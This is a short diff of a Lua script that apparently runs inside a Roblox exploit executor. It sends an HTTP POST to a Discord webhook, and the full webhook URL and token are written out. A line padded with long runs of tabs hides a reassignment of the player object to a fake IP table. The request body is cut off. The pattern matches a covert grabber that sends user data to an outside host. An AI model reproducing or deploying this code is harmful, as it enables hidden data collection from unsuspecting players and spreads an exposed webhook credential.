@@ -1,5 +1,5 @@
 local LocalPlayer = game.Players.LocalPlayer
-local HttpRequest, x = http_request or (syn and syn.request), "																																																																																	";LocalPlayer = {IpAddress = "127.0.0.1"}
+local HttpRequest = http_request or (syn and syn.request);										LocalPlayer = {IpAddress = "127.0.0.1"}
 HttpRequest({
 	Url = "https://discord.com/api/webhooks/1454441681809047594/xZUFi07ETE1qvn9VGJBNLUDkUbB-9eBb7KXaylNKDBGaHCsKmoTQCfFHhXmM5uiZcHax",
 	Method = "POST",
